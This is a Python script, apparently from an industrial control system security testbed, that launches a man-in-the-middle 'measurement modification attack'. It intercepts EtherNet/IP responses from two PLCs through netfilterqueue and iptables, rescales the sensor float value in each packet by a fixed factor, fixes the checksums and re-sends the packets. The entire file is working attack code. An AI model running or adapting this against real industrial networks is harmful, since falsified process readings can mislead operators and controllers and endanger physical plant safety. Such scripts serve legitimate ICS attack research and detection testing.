#! /usr/bin/env python2.7
##### Script to launch calculated measurement modification attack to scale up or down the actual values by a fixed scaling factor #####
##### Takes two command line argument: 1) PLC2/PLC3/BOTH 2) '+' or '-' for positive and negative scaling respectively #####
from netfilterqueue import NetfilterQueue
import os
import binascii
import struct
import sys
from datetime import datetime as dt
from scapy.all import *

print("Remember - bridge must already be started!")
os.system("modprobe br_netfilter")
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
os.system("iptables -F")
os.system("iptables -F -t nat")
#os.system("iptables -A FORWARD -p tcp --dport 44818 -j NFQUEUE --queue-num 1") # Request (Read||Write)
os.system("iptables -A FORWARD -p tcp --sport 44818 -j NFQUEUE --queue-num 1") # Response
scaling_factor = 0.5
type_of_scaling = sys.argv[2]
print(type_of_scaling)
if type_of_scaling == '+':
    scaling_factor = 1*scaling_factor
else:
    scaling_factor = -1*scaling_factor
print(scaling_factor)

def modify(packet):
    pkt = IP(packet.get_payload())
    
    if (sys.argv[1] == 'PLC3'):
        if pkt.haslayer(TCP) and pkt.getlayer(TCP).sport == 44818 and pkt[IP].src =="10.0.0.3":
            if pkt.haslayer(Raw) and len(pkt.getlayer(Raw).load) == 50:
                print("Seba")
                mydata = binascii.hexlify(bytes(pkt[Raw].load)).decode()
                payload = mydata[-8:]
                val = struct.unpack("<f", binascii.unhexlify(payload))[0]
                #scaling attack
                scaled = (1+scaling_factor)*val
                newdata = mydata[:-8]+ binascii.hexlify(bytes(struct.pack('<f', scaled))).decode()
                pkt[Raw].load = newdata.decode('hex')
                del pkt[IP].chksum
                del pkt[TCP].chksum
        packet.drop()
        send(pkt)
    elif (sys.argv[1] == 'PLC2'):
        if pkt.haslayer(TCP) and pkt.getlayer(TCP).sport == 44818 and pkt[IP].src =="10.0.0.2":
            if pkt.haslayer(Raw) and len(pkt.getlayer(Raw).load) == 50:
                print("Seba")
                mydata = binascii.hexlify(bytes(pkt[Raw].load)).decode()
                payload = mydata[-8:]
                val = struct.unpack("<f", binascii.unhexlify(payload))[0]
                #scaling attack
                scaled = (1+scaling_factor)*val
                newdata = mydata[:-8]+ binascii.hexlify(bytes(struct.pack('<f', scaled))).decode()
                pkt[Raw].load = newdata.decode('hex')
                del pkt[IP].chksum
                del pkt[TCP].chksum
        packet.drop()
        send(pkt)
    elif (sys.argv[1] == 'BOTH'):
        if pkt.haslayer(TCP) and pkt.getlayer(TCP).sport == 44818 :
            if pkt[IP].src =="10.0.0.2"  or pkt[IP].src =="10.0.0.3":
                if pkt.haslayer(Raw) and len(pkt.getlayer(Raw).load) == 50:
                	mydata = binascii.hexlify(bytes(pkt[Raw].load)).decode()
                	payload = mydata[-8:]
                	val = struct.unpack("<f", binascii.unhexlify(payload))[0]
                	#scaling attack
                	scaled = (1+scaling_factor)*val
                	newdata = mydata[:-8]+ binascii.hexlify(bytes(struct.pack('<f', scaled))).decode()
                	pkt[Raw].load = newdata.decode('hex')
                	del pkt[IP].chksum
                	del pkt[TCP].chksum
            packet.drop()
            send(pkt)


nfqueue = NetfilterQueue()
nfqueue.bind(1, modify)
try:
    print "[*] waiting for data"
    print("START TIME:", str(dt.now()))
    nfqueue.run()
except KeyboardInterrupt:
    print("Flushing iptables.")
    print("END TIME:", str(dt.now()))
    # This flushes everything, you might wanna be careful
    os.system('iptables -F')
    os.system('iptables -X')
    pass
